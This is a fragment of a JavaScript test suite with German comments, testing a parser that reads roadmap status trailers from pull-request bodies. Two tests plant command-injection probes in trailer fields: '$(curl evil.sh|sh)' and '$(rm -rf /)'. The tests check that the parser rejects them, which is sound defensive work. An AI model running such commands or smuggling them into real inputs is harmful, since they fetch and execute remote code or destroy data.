  // => Wurf — UND (Gegenprüfungs-Korrektur 3.9.2026, Opus-Prüfer) das gilt
  // unabhängig davon, in welcher Reihenfolge/Vollständigkeit die beiden
  // Trailer erscheinen, sobald irgendwo im Body eine `Roadmap-Status:`-Zeile
  // steht.
  it('wirft bei erkennbarer, aber unvollständiger Buchungs-Absicht (Roadmap-Status irgendwo im Body)', () => {
    // der exakte #507-Fall: beide Trailer da, aber in GETRENNTEN Absätzen —
    // nur der letzte (status-only) zählt als Block => laut, nie still.
    expect(() => parseBuchungAusPrBody('Text.\n\nRoadmap: QS-EFFIZIENZ\n\nRoadmap-Status: ready\n\n🤖 Generated with [Claude Code](https://claude.com/claude-code)'))
      .toThrow(/unvollständiger Buchungs-Block/);
    // (i) Regression A: Status-Absatz ZUERST, Roadmap-Absatz DANACH — der
    // Schlussblock enthält nur `Roadmap`; da irgendwo im Body dennoch eine
    // `Roadmap-Status:`-Zeile steht, gelten die strengen Regeln => Wurf.
    expect(() => parseBuchungAusPrBody('Text.\n\nRoadmap-Status: done\n\nRoadmap: QS-EFFIZIENZ'))
      .toThrow(/unvollständiger Buchungs-Block/);
    // (ii) Regression B: `Roadmap:` + `Roadmap-Status:` im SELBEN Absatz,
    // aber mit LEEREM Wert — die Zeile ist da, ein leerer Wert ist kein
    // gültiger Status => Wurf (kein stilles null).
    expect(() => parseBuchungAusPrBody('Text.\n\nRoadmap: QS-EFFIZIENZ\nRoadmap-Status:'))
      .toThrow(/unvollständiger Buchungs-Block/);
  });

  // (b) Injection-Probe im PR-Body wird verworfen — läuft durch dieselbe
  // Zeichensatz-Wache wie der Commit-Trailer-Pfad.
  it('wirft bei einem Injection-Versuch im Blocker-Token des PR-Body-Trailers', () => {
    const body = 'Text.\n\nRoadmap: QS-DATA\nRoadmap-Status: parked($(curl evil.sh|sh))';
    expect(() => parseBuchungAusPrBody(body)).toThrow(/unerlaubte Zeichen/);
  });

  it('wirft bei einem Injection-Versuch in der ID des PR-Body-Trailers', () => {
    const body = 'Text.\n\nRoadmap: $(rm -rf /)\nRoadmap-Status: done';
    expect(() => parseBuchungAusPrBody(body)).toThrow(/unerlaubte Zeichen/);
  });

  it('wirft bei ungültigem Status im PR-Body-Trailer (§6.7-Rotfall)', () => {
    const body = 'Text.\n\nRoadmap: QS-EFFIZIENZ\nRoadmap-Status: fertig';
    expect(() => parseBuchungAusPrBody(body)).toThrow(/ungültiger Wert "fertig"/);
  });
});
